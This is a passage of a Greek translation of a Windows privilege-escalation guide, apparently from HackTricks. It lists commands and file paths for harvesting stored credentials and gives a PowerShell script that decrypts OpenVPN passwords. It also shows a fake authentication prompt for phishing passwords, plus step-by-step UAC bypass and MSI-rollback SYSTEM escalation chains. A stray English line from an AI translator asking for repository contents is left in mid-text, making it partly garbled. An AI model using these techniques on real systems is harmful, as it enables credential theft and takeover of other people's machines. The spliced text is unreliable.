Εάν βρείτε οποιαδήποτε εγγραφή μέσα σε αυτήν τη διαδρομή, πιθανότατα θα είναι ένα αποθηκευμένο SSH key. Αποθηκεύεται κρυπτογραφημένο αλλά μπορεί να αποκρυπτογραφηθεί εύκολα χρησιμοποιώντας [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Περισσότερες πληροφορίες για αυτήν την τεχνική εδώ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Εάν η υπηρεσία `ssh-agent` δεν τρέχει και θέλετε να ξεκινάει αυτόματα κατά την εκκίνηση, εκτελέστε:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Φαίνεται ότι αυτή η τεχνική δεν είναι πλέον έγκυρη. Προσπάθησα να δημιουργήσω κάποια ssh keys, να τα προσθέσω με `ssh-add` και να συνδεθώ μέσω ssh σε μια μηχανή. Το registry HKCU\Software\OpenSSH\Agent\Keys δεν υπάρχει και το procmon δεν εντόπισε τη χρήση του `dpapi.dll` κατά την ασύμμετρη πιστοποίηση κλειδιού.

### Ανεπιτήρητα αρχεία
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Μπορείτε επίσης να αναζητήσετε αυτά τα αρχεία χρησιμοποιώντας **metasploit**: _post/windows/gather/enum_unattend_

Παράδειγμα περιεχομένου:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM αντίγραφα ασφαλείας
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Αναζητήστε ένα αρχείο με όνομα **SiteList.xml**

### Αποθηκευμένος GPP κωδικός

Υπήρχε προηγουμένως μια δυνατότητα που επέτρεπε την ανάπτυξη προσαρμοσμένων τοπικών administrator accounts σε μια ομάδα μηχανημάτων μέσω των Group Policy Preferences (GPP). Ωστόσο, αυτή η μέθοδος παρουσίαζε σημαντικές αδυναμίες ασφαλείας. Πρώτον, τα Group Policy Objects (GPOs), αποθηκευμένα ως αρχεία XML στο SYSVOL, μπορούσαν να προσπελαστούν από οποιονδήποτε domain user. Δεύτερον, οι κωδικοί μέσα σε αυτά τα GPPs, κρυπτογραφημένοι με AES256 χρησιμοποιώντας ένα δημόσια τεκμηριωμένο default key, μπορούσαν να αποκρυπτογραφηθούν από οποιονδήποτε authenticated user. Αυτό αποτελούσε σοβαρό κίνδυνο, καθώς θα μπορούσε να επιτρέψει σε χρήστες να αποκτήσουν elevated privileges.

Για να μετριαστεί αυτός ο κίνδυνος, αναπτύχθηκε μια συνάρτηση που σαρώνει για τοπικά cached GPP αρχεία που περιέχουν πεδίο "cpassword" το οποίο δεν είναι κενό. Όταν βρεθεί τέτοιο αρχείο, η συνάρτηση αποκρυπτογραφεί τον κωδικό και επιστρέφει ένα custom PowerShell αντικείμενο. Αυτό το αντικείμενο περιλαμβάνει λεπτομέρειες για το GPP και τη θέση του αρχείου, βοηθώντας στην ταυτοποίηση και την επιδιόρθωση αυτής της ευπάθειας ασφαλείας.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Για να αποκρυπτογραφήσετε το cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Χρήση του crackmapexec για την απόκτηση των κωδικών πρόσβασης:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### Ρύθμιση Web του IIS
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Παράδειγμα του web.config με credentials:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN διαπιστευτήρια
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Αρχεία καταγραφής
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ζητήστε τα credentials

Μπορείτε πάντα να **ζητήσετε από τον χρήστη να εισάγει τα credentials του ή ακόμα και τα credentials κάποιου άλλου χρήστη** αν νομίζετε ότι μπορεί να τα γνωρίζει (σημειώστε ότι **το να ζητήσετε** απευθείας από τον πελάτη τα **credentials** είναι πραγματικά **επικίνδυνο**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Πιθανά filenames που περιέχουν credentials**

Γνωστά αρχεία που κάποτε περιείχαν **passwords** σε **clear-text** ή **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don’t have access to your repository. Please paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md (or the other files you want translated). I’ll then translate the relevant English text to Greek following your rules.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Διαπιστευτήρια στον Κάδο Ανακύκλωσης

Επίσης πρέπει να ελέγξετε τον Κάδο Ανακύκλωσης για τυχόν διαπιστευτήρια

Για να **ανακτήσετε κωδικούς** που έχουν αποθηκευτεί από διάφορα προγράμματα μπορείτε να χρησιμοποιήσετε: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Μέσα στο μητρώο

**Άλλα πιθανά κλειδιά του μητρώου με διαπιστευτήρια**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Ιστορικό προγραμμάτων περιήγησης

Πρέπει να ελέγξετε για dbs όπου αποθηκεύονται οι κωδικοί από **Chrome ή Firefox**.\
Επίσης ελέγξτε το ιστορικό, τους σελιδοδείκτες και τα favourites των browsers καθώς ίσως κάποιοι **κωδικοί** να είναι αποθηκευμένοι εκεί.

Εργαλεία για εξαγωγή κωδικών από προγράμματα περιήγησης:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** είναι μια τεχνολογία ενσωματωμένη στο λειτουργικό σύστημα Windows που επιτρέπει την **δια-επικοινωνία** μεταξύ στοιχείων λογισμικού γραμμένων σε διαφορετικές γλώσσες. Κάθε COM component **αναγνωρίζεται μέσω ενός class ID (CLSID)** και κάθε component εκθέτει λειτουργικότητα μέσω μιας ή περισσοτέρων διεπαφών, που αναγνωρίζονται μέσω interface IDs (IIDs).

Οι κλάσεις και οι διεπαφές COM ορίζονται στο registry κάτω από **HKEY\CLASSES\ROOT\CLSID** και **HKEY\CLASSES\ROOT\Interface** αντίστοιχα. Αυτό το registry δημιουργείται συγχωνεύοντας τα **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Μέσα στα CLSIDs αυτού του registry μπορείτε να βρείτε το child registry **InProcServer32** που περιέχει μια **default value** που δείχνει σε ένα **DLL** και μια τιμή που ονομάζεται **ThreadingModel** που μπορεί να είναι **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) ή **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

Βασικά, αν μπορείτε να **overwrite οποιοδήποτε από τα DLLs** που πρόκειται να εκτελεστούν, θα μπορούσατε να **escalate privileges** αν αυτό το DLL εκτελεστεί από διαφορετικό χρήστη.

Για να μάθετε πώς οι επιτιθέμενοι χρησιμοποιούν το COM Hijacking ως μηχανισμό persistence, δείτε:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Γενική αναζήτηση κωδικών σε αρχεία και registry**

**Αναζήτηση περιεχομένου αρχείων**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Αναζήτηση αρχείου με συγκεκριμένο όνομα**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Αναζητήστε στο μητρώο ονόματα κλειδιών και κωδικούς πρόσβασης**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Εργαλεία που αναζητούν κωδικούς

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **είναι ένα msf** plugin. Το δημιούργησα για **να εκτελεί αυτόματα κάθε metasploit POST module που αναζητά credentials** μέσα στο θύμα.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) αναζητά αυτόματα όλα τα αρχεία που περιέχουν passwords που αναφέρονται σε αυτή τη σελίδα.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) είναι ένα ακόμη εξαιρετικό εργαλείο για την εξαγωγή password από ένα σύστημα.

Το εργαλείο [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) αναζητά **sessions**, **usernames** και **passwords** πολλών εργαλείων που αποθηκεύουν αυτά τα δεδομένα σε clear text (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Φανταστείτε ότι **μια διεργασία που εκτελείται ως SYSTEM ανοίγει μια νέα διεργασία** (`OpenProcess()`) με **πλήρη πρόσβαση**. Η ίδια διεργασία **επιπλέον δημιουργεί μια νέα διεργασία** (`CreateProcess()`) **με χαμηλά προνόμια αλλά κληρονομώντας όλα τα ανοικτά handles της κύριας διεργασίας**.\
Τότε, αν έχετε **πλήρη πρόσβαση στη διεργασία με χαμηλά προνόμια**, μπορείτε να αρπάξετε το **ανοικτό handle προς τη διεργασία με προνόμια που δημιουργήθηκε** με `OpenProcess()` και να **εγχύσετε shellcode**.\
[Διαβάστε αυτό το παράδειγμα για περισσότερες πληροφορίες σχετικά με **τον τρόπο ανίχνευσης και εκμετάλλευσης αυτής της ευπάθειας**.](leaked-handle-exploitation.md)\
[Διαβάστε αυτήν την **άλλη ανάρτηση για μια πιο πλήρη εξήγηση σχετικά με το πώς να δοκιμάσετε και να καταχραστείτε περισσότερα open handlers διεργασιών και threads που κληρονομούνται με διαφορετικά επίπεδα δικαιωμάτων (όχι μόνο πλήρη πρόσβαση)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Τα shared memory segments, αναφερόμενα ως **pipes**, επιτρέπουν την επικοινωνία διεργασιών και τη μεταφορά δεδομένων.

Τα Windows παρέχουν μια δυνατότητα που ονομάζεται **Named Pipes**, επιτρέποντας σε μη συγγενείς διεργασίες να μοιράζονται δεδομένα, ακόμα και σε διαφορετικά δίκτυα. Αυτό μοιάζει με αρχιτεκτονική client/server, με ρόλους ορισμένους ως **named pipe server** και **named pipe client**.

Όταν δεδομένα αποστέλλονται μέσω ενός pipe από έναν **client**, ο **server** που δημιούργησε το pipe έχει τη δυνατότητα να **υποδυθεί την ταυτότητα** του **client**, εφόσον διαθέτει τα απαραίτητα δικαιώματα **SeImpersonate**. Ο εντοπισμός μιας **προνομιούχας διεργασίας** που επικοινωνεί μέσω ενός pipe που μπορείτε να μιμηθείτε παρέχει την ευκαιρία να **αποκτήσετε υψηλότερα προνόμια** υιοθετώντας την ταυτότητα αυτής της διεργασίας όταν αλληλεπιδρά με το pipe που έχετε δημιουργήσει. Για οδηγίες εκτέλεσης μιας τέτοιας επίθεσης, χρήσιμοι οδηγοί υπάρχουν [**εδώ**](named-pipe-client-impersonation.md) και [**εδώ**](#from-high-integrity-to-system).

Επίσης, το ακόλουθο εργαλείο επιτρέπει την **παρεμβολή σε μια επικοινωνία named pipe με εργαλείο όπως το burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **και αυτό το εργαλείο επιτρέπει τη λίστα και την προβολή όλων των pipes για να βρείτε privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Διάφορα

### Επεκτάσεις αρχείων που μπορούν να εκτελέσουν κώδικα στα Windows

Δείτε τη σελίδα **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links forwarded to `ShellExecuteExW` can trigger dangerous URI handlers (`file:`, `ms-appinstaller:` or any registered scheme) and execute attacker-controlled files as the current user. See:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Παρακολούθηση γραμμών εντολών για κωδικούς**

Όταν αποκτάτε shell ως χρήστης, μπορεί να υπάρχουν scheduled tasks ή άλλες διεργασίες που εκτελούνται και **περνούν διαπιστευτήρια στη γραμμή εντολών**. Το script παρακάτω καταγράφει τις γραμμές εντολών των διεργασιών κάθε δύο δευτερόλεπτα και συγκρίνει την τρέχουσα κατάσταση με την προηγούμενη, εμφανίζοντας τυχόν διαφορές.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Κλοπή κωδικών από διεργασίες

## Από Χρήστη με Χαμηλά Δικαιώματα σε NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Εάν έχετε πρόσβαση στη γραφική διεπαφή (via console ή RDP) και το UAC είναι ενεργοποιημένο, σε κάποιες εκδόσεις του Microsoft Windows είναι δυνατό να εκτελεστεί ένα terminal ή οποιαδήποτε άλλη διεργασία όπως "NT\AUTHORITY SYSTEM" από έναν μη προνομιακό χρήστη.

Αυτό κάνει δυνατό το escalate privileges και το bypass UAC ταυτόχρονα μέσω της ίδιας ευπάθειας. Επιπλέον, δεν υπάρχει ανάγκη να εγκατασταθεί τίποτα και το binary που χρησιμοποιείται κατά τη διαδικασία είναι υπογεγραμμένο και εκδομένο από τη Microsoft.

Μερικά από τα επηρεαζόμενα συστήματα είναι τα εξής:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Για να exploit αυτή την vulnerability, είναι απαραίτητο να εκτελέσετε τα ακόλουθα βήματα:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Διαβάστε αυτό για να μάθετε για τα Επίπεδα Ακεραιότητας:


{{#ref}}
integrity-levels.md
{{#endref}}

Στη συνέχεια, διαβάστε αυτό για να μάθετε για το UAC και τις παρακάμψεις UAC:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

Η τεχνική που περιγράφεται [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) με κώδικα exploit [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Η επίθεση ουσιαστικά αξιοποιεί το rollback feature του Windows Installer για να αντικαταστήσει νόμιμα αρχεία με κακόβουλα κατά τη διαδικασία απεγκατάστασης. Για αυτό ο επιτιθέμενος πρέπει να δημιουργήσει ένα **malicious MSI installer** που θα χρησιμοποιηθεί για να καταλάβει τον φάκελο `C:\Config.Msi`, ο οποίος αργότερα θα χρησιμοποιηθεί από τον Windows Installer για να αποθηκεύει αρχεία rollback κατά την απεγκατάσταση άλλων MSI πακέτων, όπου τα rollback αρχεία θα έχουν τροποποιηθεί ώστε να περιέχουν το κακόβουλο payload.

Η συνοπτική τεχνική είναι η εξής:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Δημιουργήστε ένα `.msi` που εγκαθιστά ένα ακίνδυνο αρχείο (π.χ. `dummy.txt`) σε έναν εγγράψιμο φάκελο (`TARGETDIR`).
- Σημειώστε τον installer ως **"UAC Compliant"**, ώστε ένας **non-admin user** να μπορεί να το τρέξει.
- Κρατήστε ένα **handle** ανοιχτό στο αρχείο μετά την εγκατάσταση.

- Step 2: Begin Uninstall
- Απεγκαταστήστε το ίδιο `.msi`.
- Η διαδικασία απεγκατάστασης ξεκινά να μετακινεί αρχεία στο `C:\Config.Msi` και να τα μετονομάζει σε αρχεία `.rbf` (rollback backups).
- Ελέγχετε περιοδικά το ανοιχτό handle αρχείου χρησιμοποιώντας `GetFinalPathNameByHandle` για να εντοπίσετε πότε το αρχείο γίνεται `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- Το `.msi` περιλαμβάνει μια **custom uninstall action (`SyncOnRbfWritten`)** που:
- Σηματοδοτεί πότε το `.rbf` έχει γραφτεί.
- Στη συνέχεια **περιμένει** ένα άλλο event πριν συνεχίσει η απεγκατάσταση.

- Step 4: Block Deletion of `.rbf`
- Όταν ληφθεί το σήμα, **ανοίξτε το `.rbf` αρχείο** χωρίς `FILE_SHARE_DELETE` — αυτό **αποτρέπει τη διαγραφή του**.
- Μετά **στείλτε πίσω σήμα** ώστε να ολοκληρωθεί η απεγκατάσταση.
- Ο Windows Installer αποτυγχάνει να διαγράψει το `.rbf`, και επειδή δεν μπορεί να διαγράψει όλο το περιεχόμενο, **`C:\Config.Msi` δεν αφαιρείται**.

- Step 5: Manually Delete `.rbf`
- Εσείς (ο επιτιθέμενος) διαγράφετε χειροκίνητα το `.rbf`.
- Τώρα **`C:\Config.Msi` είναι κενό**, έτοιμο να καταληφθεί.

> Σε αυτό το σημείο, **trigger the SYSTEM-level arbitrary folder delete vulnerability** για να διαγράψετε το `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Αναδημιουργήστε τον φάκελο `C:\Config.Msi` μόνοι σας.
- Ορίστε **αδύναμα DACLs** (π.χ. Everyone:F), και **κρατήστε ένα handle ανοιχτό** με `WRITE_DAC`.

- Step 7: Run Another Install
- Εγκαταστήστε ξανά το `.msi`, με:
- `TARGETDIR`: Εγγράψιμη τοποθεσία.
- `ERROROUT`: Μια μεταβλητή που προκαλεί εξαναγκασμένη αποτυχία.
- Αυτή η εγκατάσταση θα χρησιμοποιηθεί για να προκαλέσει ξανά **rollback**, που διαβάζει `.rbs` και `.rbf`.

- Step 8: Monitor for `.rbs`
- Χρησιμοποιήστε `ReadDirectoryChangesW` για να παρακολουθείτε το `C:\Config.Msi` μέχρι να εμφανιστεί ένα νέο `.rbs`.
- Καταγράψτε το όνομα αρχείου του.

- Step 9: Sync Before Rollback
- Το `.msi` περιλαμβάνει μια **custom install action (`SyncBeforeRollback`)** που:
- Σηματοδοτεί ένα event όταν το `.rbs` δημιουργηθεί.
- Στη συνέχεια **περιμένει** πριν συνεχίσει.

- Step 10: Reapply Weak ACL
- Μετά τη λήψη του event ` .rbs created`:
- Ο Windows Installer **επαναφέρει ισχυρά ACLs** στον `C:\Config.Msi`.
- Αλλά επειδή εξακολουθείτε να έχετε ένα handle με `WRITE_DAC`, μπορείτε **να επαναφέρετε ξανά τα αδύναμα ACLs**.

> Οι ACLs **εφαρμόζονται μόνο κατά το άνοιγμα του handle**, οπότε μπορείτε ακόμη να γράψετε στον φάκελο.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Επικαλύψτε το αρχείο `.rbs` με ένα **fake rollback script** που λέει στα Windows να:
- Επαναφέρει το `.rbf` σας (κακόβουλο DLL) σε μια **privileged location** (π.χ. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Ρίξει το ψεύτικο `.rbf` σας που περιέχει ένα **κακόβουλο SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Σηματοδοτήστε το sync event ώστε ο installer να συνεχίσει.
- Μια **type 19 custom action (`ErrorOut`)** είναι ρυθμισμένη να **εσκεμμένα αποτυγχάνει την εγκατάσταση** σε γνωστό σημείο.
- Αυτό προκαλεί την έναρξη του **rollback**.

- Step 13: SYSTEM Installs Your DLL
- Ο Windows Installer:
- Διαβάζει το κακόβουλο `.rbs` σας.
- Αντιγράφει το `.rbf` DLL σας στην προοριζόμενη τοποθεσία.
- Τώρα έχετε το **κακόβουλο DLL σε διαδρομή που φορτώνει το SYSTEM**.

- Final Step: Execute SYSTEM Code
- Τρέξτε ένα αξιόπιστο **auto-elevated binary** (π.χ. `osk.exe`) που φορτώνει το DLL που καταλάβατε.
- **Boom**: Ο κώδικάς σας εκτελείται **ως SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Η κύρια τεχνική MSI rollback (η προηγούμενη) υποθέτει ότι μπορείτε να διαγράψετε έναν **ολόκληρο φάκελο** (π.χ. `C:\Config.Msi`). Αλλά τι γίνεται αν η ευπάθειά σας επιτρέπει μόνο **arbitrary file deletion**;

Μπορείτε να εκμεταλλευτείτε τα internals του NTFS: κάθε φάκελος έχει ένα κρυφό alternate data stream που ονομάζεται:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Αυτό το stream αποθηκεύει τα **μεταδεδομένα ευρετηρίου** του φακέλου.

Έτσι, αν **διαγράψετε το stream `::$INDEX_ALLOCATION`** ενός φακέλου, το NTFS **αφαιρεί ολόκληρο τον φάκελο** από το σύστημα αρχείων.

Μπορείτε να το κάνετε χρησιμοποιώντας τις τυπικές APIs διαγραφής αρχείων, όπως:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Παρόλο που καλείς ένα *file* delete API, αυτό **διαγράφει τον ίδιο τον φάκελο**.

### Από Folder Contents Delete σε SYSTEM EoP
